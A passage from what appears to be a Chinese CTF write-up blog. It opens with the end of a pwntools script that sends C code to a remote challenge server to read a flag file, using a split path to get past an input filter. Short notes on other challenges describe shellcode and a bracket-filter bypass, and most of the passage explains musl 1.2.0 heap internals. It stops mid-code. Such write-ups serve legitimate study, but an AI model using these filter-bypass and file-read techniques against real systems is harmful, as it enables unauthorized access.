arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10075</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    char buf[50]; </span></span><br><span class="line"><span class="string">    char path_part_1[5] = &quot;/hom&quot;; </span></span><br><span class="line"><span class="string">    char path_part_2[5] = &quot;e/ct&quot;; </span></span><br><span class="line"><span class="string">    char path_part_3[5] = &quot;f/fl&quot;; </span></span><br><span class="line"><span class="string">    char path_part_4[5] = &quot;agx00&quot;; </span></span><br><span class="line"><span class="string">    char path[20];</span></span><br><span class="line"><span class="string">    sprintf(path, &quot;%s%s%s%s&quot;, path_part_1, path_part_2, path_part_3, path_part_4);</span></span><br><span class="line"><span class="string">    int fd = open(path);</span></span><br><span class="line"><span class="string">    read(fd,buf,50);</span></span><br><span class="line"><span class="string">    write(1,buf,50);</span></span><br><span class="line"><span class="string">&#125;@</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&#x27;@&#x27;)&quot;</span>, program)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>




        <h1 id="四、DEFCON-CTF-Qualifier-2020-introool"   >
          <a href="#四、DEFCON-CTF-Qualifier-2020-introool" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、DEFCON-CTF-Qualifier-2020-introool" class="headerlink" title="四、DEFCON CTF Qualifier 2020 introool"></a>四、DEFCON CTF Qualifier 2020 introool</h1>
      <p>这题不太想调，就是patch，写汇编跳转shellcode等</p>

        <h1 id="五、-Redhat2019-Kaleidoscope"   >
          <a href="#五、-Redhat2019-Kaleidoscope" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-Redhat2019-Kaleidoscope" class="headerlink" title="五、[Redhat2019] Kaleidoscope"></a>五、[Redhat2019] Kaleidoscope</h1>
      <p>这题找不着附件，简单来说就是两个东西<code>Kaleidoscope</code>即时解释器和<code>honggfuzz</code></p>

        <h1 id="六、2020-DAS-CTF-OJ1"   >
          <a href="#六、2020-DAS-CTF-OJ1" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、2020-DAS-CTF-OJ1" class="headerlink" title="六、2020 DAS-CTF OJ1"></a>六、2020 DAS-CTF OJ1</h1>
      <p>不能输入括号，大中小括号等，例如<code>int main()&#123;&#125;</code>等等都不行，可以用如下的形式来进行</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x55</span>,a1=<span class="number">0x48</span>,a2=<span class="number">0x89</span>,a3=<span class="number">0xe5</span>;</span><br></pre></td></tr></table></div></figure>

<p>编译之后可以看到如下，直接形成汇编代码，那么就可以直接写汇编通i过shellcode或者orw来获取flag了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091335752.png" alt="image-20220209133547687"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091334057.png" alt="image-20220209133415993"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/22/Musl%E4%BB%8E0%E5%BC%80%E5%A7%8B/">Musl从0开始</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-08-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、1-2-0及以前版本"   >
          <a href="#一、1-2-0及以前版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、1-2-0及以前版本" class="headerlink" title="一、1.2.0及以前版本"></a>一、1.2.0及以前版本</h1>
      
        <h2 id="1-数据结构"   >
          <a href="#1-数据结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-数据结构" class="headerlink" title="1.数据结构"></a>1.数据结构</h2>
      
        <h3 id="1-chunk结构"   >
          <a href="#1-chunk结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-chunk结构" class="headerlink" title="(1)chunk结构"></a>(1)chunk结构</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0 定义在src/internal/malloc_impl.h中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; <span class="comment">// 相当于 glibc 的 prev size 和 size</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>①不重用psize字段</p>
<p>②psize和size都有inuse标志位，分别代表前一个chunk和当前chunk的使用状态。</p>

        <h3 id="2-堆管理结构mal"   >
          <a href="#2-堆管理结构mal" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-堆管理结构mal" class="headerlink" title="(2)堆管理结构mal"></a>(2)堆管理结构mal</h3>
      <p>类似于arena，记录堆中的相关状态，bins结构体等</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  定义在src/malloc/malloc.c中</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap; <span class="comment">//64位无符号整数binmap</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-bitmap"   >
          <a href="#3-bitmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-bitmap" class="headerlink" title="(3)bitmap:"></a>(3)bitmap:</h3>
      <p><code>binmap</code>记录每个 bin 是否为非空，若对应某个比特位为 1，则表示对应的 bin 为非空，存在chunk</p>
<p>在unbin函数操作过程中，如果操作的chunk(C)的prev和next指针相等，就会将对应的bin的bitmap设置为0，使其处于置空的状态。</p>

        <h3 id="4-bins"   >
          <a href="#4-bins" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-bins" class="headerlink" title="(4)bins"></a>(4)bins</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0 定义在src/internal/malloc_impl.h中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>构成类似unsortedbin的双向循环链表，当链表为空时，<code>head</code>和<code>tail</code>指针等于 0 或者指向链表头部自身。</p>
<p>每个bin存储的chunk范围如下</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">bin 下标 i</th>
<th align="left">chunk 大小个数</th>
<th align="center">chunk 大小范围</th>
<th align="center">下标 i 与 chunk 大小范围的关系</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0-31</td>
<td align="left">1</td>
<td align="center">0x20 – 0x400</td>
<td align="center">(i+1) * 0x20</td>
</tr>
<tr>
<td align="left">32-35</td>
<td align="left">8</td>
<td align="center">0x420 – 0x800</td>
<td align="center">(0x420+(i-32) <em>0x100) ~ (0x500+(i-32)</em> 0x100)</td>
</tr>
<tr>
<td align="left">36-39</td>
<td align="left">16</td>
<td align="center">0x820 – 0x1000</td>
<td align="center">(0x820+(i-36) <em>0x200) ~ (0x1000+(i-36)</em> 0x200)</td>
</tr>
<tr>
<td align="left">40-43</td>
<td align="left">32</td>
<td align="center">0x1020 – 0x2000</td>
<td align="center">(0x1020+(i-40) <em>0x400) ~ (0x1400+(i-40)</em> 0x400)</td>
</tr>
<tr>
<td align="left">44-47</td>
<td align="left">64</td>
<td align="center">0x2020 – 0x4000</td>
<td align="center">(0x2020+(i-44) <em>0x800) ~ (0x2800+(i-44)</em> 0x800)</td>
</tr>
<tr>
<td align="left">48-51</td>
<td align="left">128</td>
<td align="center">0x4020 – 0x8000</td>
<td align="center">(0x4020+(i-48) <em>0x1000) ~ (0x5000+(i-48)</em> 0x1000)</td>
</tr>
<tr>
<td align="left">52-55</td>
<td align="left">256</td>
<td align="center">0x8020 – 0x10000</td>
<td align="center">(0x8020+(i-52) <em>0x2000) ~ (0xa000+(i-52)</em> 0x2000)</td>
</tr>
<tr>
<td align="left">56-59</td>
<td align="left">512</td>
<td align="center">0x10020 – 0x20000</td>
<td align="center">(0x10020+(i-56) <em>0x4000) ~ (0x14000+(i-56)</em> 0x4000)</td>
</tr>
<tr>
<td align="left">60-62</td>
<td align="left">1024</td>
<td align="center">0x20020 – 0x38000</td>
<td align="center">(0x20020+(i-60) <em>0x8000) ~ (0x28000+(i-60)</em> 0x8000)</td>
</tr>
<tr>
<td align="left">63</td>
<td align="left">无限</td>
<td align="center">0x38000 以上</td>
<td align="center">0x38000 ~</td>
</tr>
</tbody></table></div>
<p>前 32 个 bin 类似 fastbin和smallbin，每个 bin 只对应一种大小的 chunk，但是也是双向循环链表，第一个释放到bins中的chunk都会使得next和prev指针带上libc地址。</p>
<p>后面的则类似largebin，对应多种范围大小的chunk。</p>

        <h2 id="2-维护方式"   >
          <a href="#2-维护方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-维护方式" class="headerlink" title="2.维护方式"></a>2.维护方式</h2>
      <p>在 64 位系统下 chunk 大小是以 32 字节对齐的，这与 glibc 16 字节对齐不同，故 chunk 大小最小为 0x20 字节，然后按 0x40、0x60、0x80… 逐渐递增，不共用psize位，所以每次都会将申请的size+0x10。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x10)-&gt;0x20</span><br><span class="line">malloc(0x11)-&gt;0x40</span><br><span class="line">malloc(0x2f)-&gt;0x40</span><br><span class="line">malloc(0x30)-&gt;0x40</span><br><span class="line">malloc(0x31)-&gt;0x60</span><br></pre></td></tr></table></div></figure>

<p>维护链表的方式是 FILO（从链表首部取出 chunk，从尾部插入 chunk），并且都是双向循环链表</p>
<p>没有实现如<code>__malloc_hook</code>、<code>__free_hook</code>之类的 hook 函数</p>

        <h2 id="3-关键函数"   >
          <a href="#3-关键函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-关键函数" class="headerlink" title="3.关键函数"></a>3.关键函数</h2>
      
        <h3 id="1-mallco"   >
          <a href="#1-mallco" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-mallco" class="headerlink" title="(1)mallco"></a>(1)mallco</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调整n大小，对齐0x20</span></span><br><span class="line">	<span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果n大于MMAP_THRESHOLD (0x38000)，使用 mmap</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">		<span class="keyword">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (base == (<span class="keyword">void</span> *)<span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		c = (<span class="keyword">void</span> *)(base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">		c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">		<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算对应的binmap下标i</span></span><br><span class="line">	i = bin_index_up(n);</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//查找binmap</span></span><br><span class="line">		<span class="keyword">uint64_t</span> mask = mal.binmap &amp; -(<span class="number">1ULL</span>&lt;&lt;i);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果bin均为空，那么调用expand_heap函数延展堆空间，生成新的chunk返回</span></span><br><span class="line">		<span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">			c = expand_heap(n);</span><br><span class="line">			<span class="keyword">if</span> (!c) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (alloc_rev(c)) &#123;</span><br><span class="line">				<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">x</span> =</span> c;</span><br><span class="line">				c = PREV_CHUNK(c);</span><br><span class="line">				NEXT_CHUNK(x)-&gt;psize = c-&gt;csize =</span><br><span class="line">					x-&gt;csize + CHUNK_SIZE(c);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取大小最接近n(size)的可用bin下标j</span></span><br><span class="line">		j = first_set(mask);</span><br><span class="line">		lock_bin(j);</span><br><span class="line">		c = mal.bins[j].head;</span><br><span class="line">        <span class="comment">//BIN_TO_CHUNK不知道什么函数</span></span><br><span class="line">		<span class="keyword">if</span> (c != BIN_TO_CHUNK(j)) &#123;、</span><br><span class="line">            <span class="comment">//使用 pretrim判断c的大小和需求的size(n)，相差太大就切割</span></span><br><span class="line">            <span class="comment">//否则使用 unlock从链表中取出</span></span><br><span class="line">			<span class="keyword">if</span> (!pretrim(c, n, i, j)) unbin(c, j);</span><br><span class="line">			unlock_bin(j);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		unlock_bin(j);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now patch up in case we over-allocated */</span></span><br><span class="line">    <span class="comment">//切割之后回收 c 中大小超过 n 的部分</span></span><br><span class="line">	trim(c, n);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="详细步骤："   >
          <a href="#详细步骤：" class="heading-link"><i class="fas fa-link"></i></a><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4>
      <ul>
<li><p>调整 n，对齐0x20</p>
</li>
<li><p> 如果 n &gt; MMAP_THRESHOLD (0x38000)，使用 mmap 创建一块大小为 n 的内存，返回给用户。</p>
</li>
<li><p>如果 n &lt;= MMAP_THRESHOLD (0x38000)，计算 n 对应的 bin 下标 i，查找 binmap</p>
<ul>
<li><p>如果所有的可用 bin 均为空，调用expand_heap函数延展堆空间，生成一个新的 chunk返回</p>
</li>
<li><p>如果存在非空的可用 bin，选择大小最接近 n 的 bins[j]，得到 bin 链表首部的 chunk c<br>如果符合 pretrim 条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c，最后将分割剩下的chunk进入trim函数回收，将c返回给用户。</p>
</li>
</ul>
</li>
</ul>
<p>至于那个unlock_bin好像是同步用的，应该是多线程防止竞争读写吧，不太懂</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="comment">/* Synchronization tools */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (libc.threads_minus_1)</span><br><span class="line">		<span class="keyword">while</span>(a_swap(lk, <span class="number">1</span>)) __wait(lk, lk+<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *lk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (lk[<span class="number">0</span>]) &#123;</span><br><span class="line">		a_store(lk, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (lk[<span class="number">1</span>]) __wake(lk, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">lock_bin</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	lock(mal.bins[i].lock);</span><br><span class="line">	<span class="keyword">if</span> (!mal.bins[i].head)</span><br><span class="line">		mal.bins[i].head = mal.bins[i].tail = BIN_TO_CHUNK(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">unlock_bin</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	unlock(mal.bins[i].lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="①unbin"   >
          <a href="#①unbin" class="heading-link"><i class="fas fa-link"></i></a><a href="#①unbin" class="headerlink" title="①unbin"></a>①unbin</h4>
      <p>类似于unlink的解链操作，无任何检测</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unbin</span><span class="params">(struct chunk *c, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">		a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span>&lt;&lt;i));</span><br><span class="line">    <span class="comment">//解链</span></span><br><span class="line">	c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">	c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    <span class="comment">//设置 INUSE 标志位，双重标志位都会设置</span></span><br><span class="line">	c-&gt;csize |= C_INUSE;</span><br><span class="line">	NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="②pretrim"   >
          <a href="#②pretrim" class="heading-link"><i class="fas fa-link"></i></a><a href="#②pretrim" class="headerlink" title="②pretrim"></a>②pretrim</h4>
      <p>切割chunk，需要满足一定条件才会进行切割操作</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="comment">/* pretrim - trims a chunk _prior_ to removing it from its bin.</span></span><br><span class="line"><span class="comment"> * Must be called with i as the ideal bin for size n, j the bin</span></span><br><span class="line"><span class="comment"> * for the _free_ chunk self, and bin j locked. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pretrim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> n1;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We cannot pretrim if it would require re-binning. */</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 条件 1:j(大小最接近size的可用bin下标)大于 40</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 条件 2: j(大小最接近size的可用bin下标)与i(计算出来的bin下标)相隔 3 个 bin 或以上，</span></span><br><span class="line">    <span class="comment">// 或者j(大小最接近size的可用bin下标)等于63且size相差大于 MMAP_THRESHOLD(0x38000)</span></span><br><span class="line">	<span class="keyword">if</span> (j &lt; i+<span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">		<span class="keyword">if</span> (n1-n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		n1 = CHUNK_SIZE(self);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//条件3: size相差的数值属于bins[j]的范围内，即split与self属于同一个bin</span></span><br><span class="line">	<span class="keyword">if</span> (bin_index(n1-n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//切割出一块大小为n的chunk用来返回</span></span><br><span class="line">	next = NEXT_CHUNK(self);</span><br><span class="line">	split = (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)self + n);</span><br><span class="line"></span><br><span class="line">	split-&gt;prev = self-&gt;prev;</span><br><span class="line">	split-&gt;next = self-&gt;next;</span><br><span class="line">	split-&gt;prev-&gt;next = split;</span><br><span class="line">	split-&gt;next-&gt;prev = split;</span><br><span class="line">	split-&gt;psize = n | C_INUSE;</span><br><span class="line">	split-&gt;csize = n1-n;</span><br><span class="line">	next-&gt;psize = n1-n;</span><br><span class="line">	self-&gt;csize = n | C_INUSE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>取个名字好听点：</p>
<p><code>J：search_bin_idx</code></p>
<p><code>I：calc_bin_idx</code></p>
<p><code>n：need_size</code></p>
<p>总的条件如下：</p>
<ul>
<li><p><code>search_bin_idx</code>大于 40</p>
</li>
<li><p><code>search_bin_idx</code>与<code>calc_bin_idx</code>相隔 3 个 bin 或以上，或者<code>search_bin_idx</code>等于63且<code>bins[search_bin_idx].head-&gt;size - need_size &gt; MMAP_THRESHOLD(0x38000)</code></p>
</li>
<li><p><code>bins[search_bin_idx].head-&gt;size - need_size</code>的值在<code>bins[search_bin_idx]</code>中</p>
</li>
</ul>
<p>即在将Chunk拿出bin之前，先进行切割赋值，设置对应的指针，然后才解链，chunk还是从bin中找到的chunk，之后在unbin中进行inuse位的修改。</p>

        <h4 id="③trim"   >
          <a href="#③trim" class="heading-link"><i class="fas fa-link"></i></a><a href="#③trim" class="headerlink" title="③trim"></a>③trim</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  src/malloc/malloc.c中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trim</span><span class="params">(struct chunk *self, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//类似于unsortebin中如果多出来的size小于0x10，那就直接返回给用户一样</span></span><br><span class="line">    <span class="comment">//DONTCARE(0x10)，也就是确保回收的chunk的size至少为0x10，chunk至少0x20对齐</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	next = 